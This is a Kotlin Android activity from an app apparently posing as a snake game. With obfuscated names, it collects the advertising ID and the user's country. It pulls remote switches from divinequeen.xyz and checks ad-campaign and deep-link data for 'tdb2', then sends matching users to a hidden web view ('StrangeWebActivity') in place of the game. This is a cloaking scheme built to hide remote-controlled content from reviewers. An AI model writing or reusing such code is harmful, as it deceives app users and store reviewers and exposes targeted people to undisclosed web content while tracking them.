package com.snake.io.slither.w

import android.content.Context
import android.content.Intent
import android.os.Bundle
import androidx.appcompat.app.AppCompatActivity
import com.appsflyer.AppsFlyerConversionListener
import com.appsflyer.AppsFlyerLib
import com.facebook.applinks.AppLinkData
import com.google.android.gms.ads.identifier.AdvertisingIdClient
import com.orhanobut.hawk.Hawk
import com.snake.io.slither.w.MaaaainClas.Companion.C1ftgtgttgfrgtKgf
import com.snake.io.slither.w.MaaaainClas.Companion.DEEPLfrfrrf66
import com.snake.io.slither.w.MaaaainClas.Companion.MAIN_IDdrfrrfdfrgt
import com.snake.io.slither.w.MaaaainClas.Companion.appsCheckfrfrrffgt
import com.snake.io.slither.w.MaaaainClas.Companion.linkfrfrrfFjrjgtj
import com.snake.io.slither.w.databinding.ActivityMainBinding
import com.snake.io.slither.w.gaaaaamy.GamyyyyyyActivity
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.GlobalScope
import kotlinx.coroutines.Job
import kotlinx.coroutines.launch
import retrofit2.Retrofit
import retrofit2.converter.gson.GsonConverterFactory
import java.util.concurrent.Executors
import java.util.concurrent.TimeUnit

class MainActivity : AppCompatActivity() {

    lateinit var ghkyhyhyhy: ActivityMainBinding

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        ghkyhyhyhy = ActivityMainBinding.inflate(layoutInflater)
        setContentView(ghkyhyhyhy.root)

        fjrgjtjgt(this)
        GlobalScope.launch(Dispatchers.IO) {
            cane
        }

        AppsFlyerLib.getInstance()
            .init("Y9oL3cG3V4Djf9zipjthG", hyjuuuj, applicationContext)
        AppsFlyerLib.getInstance().start(this)

    }


    private fun frgyktohkyk(){
        val lpkiip = AdvertisingIdClient(applicationContext)
        lpkiip.start()
        val gtgtgtgt = lpkiip.info.id
        Hawk.put(MAIN_IDdrfrrfdfrgt, gtgtgtgt)
    }

    private suspend fun gtgtgttgtg(): String? {
        val retrofitBuilder = Retrofit.Builder()
            .addConverterFactory(GsonConverterFactory.create())
            .baseUrl("http://pro.ip-api.com/")
            .build()
            .create(ApiInterfaceeeeefrrfrrf::class.java)

        val gtjgitjt = retrofitBuilder.getData().body()?.cococod
        return gtjgitjt

    }






    private suspend fun mopa(): String? {
        val popa = Retrofit.Builder()
            .addConverterFactory(GsonConverterFactory.create())
            .baseUrl("http://divinequeen.xyz/")
            .build()
            .create(ApiInterfaceeeeefrrfrrf::class.java)

        val jujujjuju = popa.getDataDev().body()?.vkgvkgt
        val gthky = popa.getDataDev().body()?.apfprpg
        Hawk.put(appsCheckfrfrrffgt, gthky)
        Hawk.put(linkfrfrrfFjrjgtj, jujujjuju)
        val hyjuijikiki = popa.getDataDev().body()?.ghrtgtugt
        return hyjuijikiki
    }

    private val cane: Job = GlobalScope.launch(Dispatchers.IO) {
        val corso: String = gtgtgttgtg().toString()
        val hykhk = mopa().toString()
        val dobbb: String? = Hawk.get(DEEPLfrfrrf66, "null")

        val gtgoktkh = Hawk.get(appsCheckfrfrrffgt, "null")
        var naming: String? = Hawk.get(C1ftgtgttgfrgtKgf)
        frgyktohkyk()
        if (gtgoktkh == "1") {
            val exfrgt = Executors.newSingleThreadScheduledExecutor()
            exfrgt.scheduleAtFixedRate({
                if (naming != null) {

                    if (naming!!.contains("tdb2") || hykhk.contains(corso) || dobbb!!.contains("tdb2")) {
                        exfrgt.shutdown()
                        startActivity(Intent(this@MainActivity, StrangeWebActivity::class.java))
                        finish()
                    } else {
                        exfrgt.shutdown()
                        startActivity(Intent(this@MainActivity, GamyyyyyyActivity::class.java))
                        finish()
                    }
                } else {
                    naming = Hawk.get(C1ftgtgttgfrgtKgf)
                }

            }, 0, 2, TimeUnit.SECONDS)
        }
        else if (hykhk.contains(corso)) {
            startActivity(Intent(this@MainActivity, StrangeWebActivity::class.java))
            finish()
        } else {
            startActivity(Intent(this@MainActivity, GamyyyyyyActivity::class.java))
            finish()
        }
    }


    private val hyjuuuj = object : AppsFlyerConversionListener {
        override fun onConversionDataSuccess(data: MutableMap<String, Any>?) {
            val dataGotten = data?.get("campaign").toString()
            Hawk.put(C1ftgtgttgfrgtKgf, dataGotten)
        }

        override fun onConversionDataFail(p0: String?) {

        }

        override fun onAppOpenAttribution(p0: MutableMap<String, String>?) {

        }

        override fun onAttributionFailure(p0: String?) {
        }
    }

    fun fjrgjtjgt(context: Context) {
        AppLinkData.fetchDeferredAppLinkData(
            context
        ) { appLinkData: AppLinkData? ->
            appLinkData?.let {
                val papapapa = appLinkData.targetUri.host.toString()
                Hawk.put(DEEPLfrfrrf66, papapapa)
            }
            if (appLinkData == null) {

            }
        }
    }




}


